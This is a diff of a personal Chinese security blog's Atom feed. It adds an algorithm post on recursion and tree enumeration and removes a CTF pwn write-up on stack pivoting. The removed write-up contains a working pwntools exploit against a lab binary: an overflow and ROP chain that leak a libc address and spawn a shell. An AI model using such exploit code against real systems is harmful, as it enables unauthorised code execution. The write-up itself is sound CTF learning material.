@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.yof3ng.xyz/"/>
-  <updated>2019-02-21T12:16:04.965Z</updated>
+  <updated>2019-03-17T08:52:17.895Z</updated>
   <id>http://www.yof3ng.xyz/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Algorithm_Recursive_Tree</title>
+    <link href="http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/"/>
+    <id>http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/</id>
+    <published>2019-03-17T08:50:11.000Z</published>
+    <updated>2019-03-17T08:52:17.895Z</updated>
+    
+    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Algorithm——递归思想和树"><a href="#Algorithm——递归思想和树" class="headerlink" title="Algorithm——递归思想和树"></a>Algorithm——递归思想和树</h1><p>😄算法太菜。</p><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>借助一简单的算法程序设计题来熟悉<code>递归思想</code>和<code>简单Tree</code>.</p><pre class=" language-c++"><code class="language-c++">题面为：给一个正整数n，求有多少种非0的整数组合之和等于n.例如：    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>通过树分支的方式来寻找答案，树的根<code>root=1</code>，然后逐渐循环获取每个分支之和为n，小于n则继续扩展。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c++"><code class="language-c++">#include<iostream>#include<algorithm> #include<vector>#include<set>using namespace std;int flag=0;vector<string> tree;int di_gui(int head,int result,string treeone="1"){    for(int i=1;i<=result-head;++i){        if(i+head<result){            string treetmp = treeone;            treetmp+=to_string(i);            di_gui(i+head,result,treetmp);            //cout<<"dian"<<endl;        }        else{            string treetmp2 = treeone;            treetmp2+=to_string(i);            tree.push_back(treetmp2);            flag++;            //cout<<flag<<endl;        }    }}string sort_string(string it){    char arrchr[it.size()];    string tmp ="";    for(int i=0;i<it.size();++i){        arrchr[i] = it.at(i);    }    sort(&arrchr[0],&arrchr[it.size()]);    for(int i=0;i<it.size();++i){        tmp += arrchr[i];    }    return tmp;}set<string> get_set(vector<string> atree){    set<string> tmp;    for(int i=0;i<atree.size();++i){        tmp.insert(sort_string(atree.at(i)));    }    return tmp;}int main(){    int num;    int head;    cin>>num;    di_gui(1,num);    cout<<flag<<endl;    //去重处理     set<string> result = get_set(tree);    for(auto it=result.begin();it!=result.end();++it){        cout<<*it<<endl;    }//    for(int i=0;i<tree.size();++i){//        cout<<tree.at(i)<<endl;//    }}</code></pre><p>可以看到flag变量对应的就是Tree的分支总数，而题目要求的是没有重复组合的结果，在树的分支中存在重复的节点，例如我们要获得<code>n=5</code>的结果，那么<code>1-3-1</code>和<code>1-1-3</code>两个分支就产生了重复，此时对树的分支进行结点排序，然后通过集合去重，这时得到的才是真正的结果。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>如果<code>di_gui</code>不用全局变量flag的话，可以把flag放入方法中：</p><pre class=" language-c++"><code class="language-c++">int di_gui(int head,int result,string treeone="1"){    int flag=0;    for(int i=1;i<=result-head;++i){        if(i+head<result){            string treetmp = treeone;            treetmp+=to_string(i);            flag+=di_gui(i+head,result,treetmp);            //cout<<"dian"<<endl;        }        else{            string treetmp2 = treeone;            treetmp2+=to_string(i);            tree.push_back(treetmp2);            flag++;            //cout<<flag<<endl;        }    }    return flag;}</code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>Python版固定长度的字符串排列组合：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 这里是递归函数的出口，为什么呢，因为这里表示：一个长度为1的字符串，它的排列组合就是它自己。</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#保存字符串的所有可能排列组合</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#这个循环，对应 解题思路1）确定字符串的第一个字母是谁，有n种可能（n为字符串s的长度</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#这个循环，对应 解题思路2）进入递归，s[0:i]+s[i+1:]的意思就是把s中的s[i]给去掉</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 对应 解题思路2）问题就从“返回字符串中的字母排列组合” **变成了** “返回 第一个字母+除去第一个字母外的字符串的排列组合”</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#要排列组合的字符</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>同样是递归＋Tree的方法获取到结果。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h1 id=&quot;Algorithm——递归思想和树&quot;&gt;&lt;a href=&quot;#Algorithm——递归思想和树&quot; class=&quot;headerlink&quot; title=&quot;Algorithm——递归思想和树&quot;&gt;&lt;/a&gt;Algorithm——递归思想和树&lt;/h1&gt;
+      
+    
+    </summary>
+    
+      <category term="Algorithm" scheme="http://www.yof3ng.xyz/categories/Algorithm/"/>
+    
+    
+      <category term="Algorithm" scheme="http://www.yof3ng.xyz/tags/Algorithm/"/>
+    
+      <category term="Tree" scheme="http://www.yof3ng.xyz/tags/Tree/"/>
+    
+  </entry>
   
   <entry>
     <title>IP匿名性研究</title>
@@ -70,11 +98,11 @@
       <category term="译文" scheme="http://www.yof3ng.xyz/categories/%E8%AF%91%E6%96%87/"/>
     
     
-      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="资讯" scheme="http://www.yof3ng.xyz/tags/%E8%B5%84%E8%AE%AF/"/>
     
       <category term="译文" scheme="http://www.yof3ng.xyz/tags/%E8%AF%91%E6%96%87/"/>
+    
+      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -99,9 +127,9 @@
       <category term="网络安全" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
-    
       <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
     
       <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
     
@@ -366,9 +394,9 @@
     
       <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
     
-      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
-    
       <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
     
   </entry>
   
@@ -425,9 +453,9 @@
     
       <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
     
-      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
-    
       <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
     
   </entry>
   
@@ -571,39 +599,9 @@
     
       <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
     
-      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
-    
       <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
     
-  </entry>
-  
-  <entry>
-    <title>Pwn-10月25-Hitcon(三)</title>
-    <link href="http://www.yof3ng.xyz/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
-    <id>http://www.yof3ng.xyz/2018/10/25/Pwn-10月25-Hitcon-三/</id>
-    <published>2018-10-25T00:54:34.000Z</published>
-    <updated>2018-10-25T09:16:07.488Z</updated>
-    
-    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月25-Hitcon-三"><a href="#Pwn-10月25-Hitcon-三" class="headerlink" title="Pwn-10月25-Hitcon(三)"></a>Pwn-10月25-Hitcon(三)</h1><blockquote><p>一天一天慢慢来，😭</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>这个题目涉及到栈迁移(stack-pivot)，在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>上面是有这个例题和解释的。</p><blockquote><p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求:</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>在这题中，溢出长度不够导致无法一次性构造ropchain，并且还限制了main函数溢出的次数。</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>开启了NX。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>ida 里面看一看：</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>buf大小为0x28 = 40字节，而read读取0x40 = 64字节</p><p>gdb跑一下，看看具体情况：</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>也就是说有4个字节被读取到EBP中，剩下20个溢出字节可以用来构造ropchain。</p><p>搜索一下可用的gadget：</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#懵逼栈</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp运行效果：<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>这题伪造假栈帧，从而构造ropchain，简直就是一场消化盛宴，我需要好好消化一下lab6。</p><p>今天还看了一下安恒一周年特别赛的一道pwn题–over，做一半发现只能控制ebp和eip？？？没想到是安恒杯六月赛的一道原题，在ctf-wiki的花式栈溢出技巧里面有，并且和lab6一样也是通过控制ebp和eip来做，但是那题并没有多出来的溢出字节。</p><p>总的来说，两种都可以称作伪造假栈帧：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-花式栈溢出</a>。</p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h1 id=&quot;Pwn-10月25-Hitcon-三&quot;&gt;&lt;a href=&quot;#Pwn-10月25-Hitcon-三&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月25-Hitcon(三)&quot;&gt;&lt;/a&gt;Pwn-10月25-Hitcon(三
-      
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
-    
-    
-      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
-    
       <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
-    
-      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
